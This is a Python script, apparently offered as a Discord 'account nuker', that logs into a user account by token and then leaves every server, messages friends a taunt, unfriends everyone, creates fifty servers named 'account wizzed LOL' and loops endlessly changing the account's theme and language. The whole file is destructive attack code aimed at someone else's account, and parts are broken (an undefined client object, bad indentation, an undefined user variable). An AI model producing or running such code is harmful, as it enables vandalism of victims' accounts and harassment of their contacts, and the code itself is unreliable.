token = "user token"
import discord
from colorama import Fore as C
import random

#i pasted locales because who feels like doing their own

locales = [
   "da", 
   "de",
   "en-GB", 
   "en-US",
   "es-ES", 
   "fr",
   "hr", 
   "it",
   "lt", 
   "hu",
   "nl", 
   "no",
   "pl", 
   "pt-BR",
   "ro", 
   "fi",
   "sv-SE", 
   "vi",
   "tr", 
   "cs",
   "el", 
   "bg",
   "ru", 
   "uk",
   "th", 
   "zh-CN",
   "ja", 
   "zh-TW",
   "ko"
]

@client.event
  async def on_connect(self):
    for guild in client.guilds:
      try:
        await guild.leave()
        print (f"{C.RED}Left {C.WHITE}{guild.name}")
      except:
        print (f"{C.RED}Couldn't leave {C.WHITE}{guild.name}")
    for friend in client.user.friends:
      try:
        await user.send("This account got nuked by jays#0023's account nuker. / https://github.com/jayshimself")
        print (f"{C.RED}Sent to {C.WHITE}{user.name}")
      except:
        print (f"{C.RED}Couldn't delete {C.WHITE}{guild.name}")
    for friend in client.friends:
      try:
        await client.remove_friend(friend)
        print (f"{C.RED}Unfriended {C.WHITE}{friend.name}#{friend.discriminator}")
      except:
        print (f"{C.RED}Failed to unfriend {C.WHITE}{friend.name}")
    game = discord.Game("github.com/jayshimself lol")
    await client.change_presence(status=discord.Status.dnd, activity=game)
    for i in range(50):
      await client.create_guild(name = "account wizzed LOL")
    print(f"{C.RED}{client.user.name}#{client.user.discriminator}'s{C.YELLOW} account has been nuked successfully!")
    while True:
      await client.user.edit_settings(theme = discord.Theme.light, locale = random.choice(locales))
      await client.user.edit_settings(theme = discord.Theme.dark, locale = random.choice(locales))


client.run(token, bot = False)
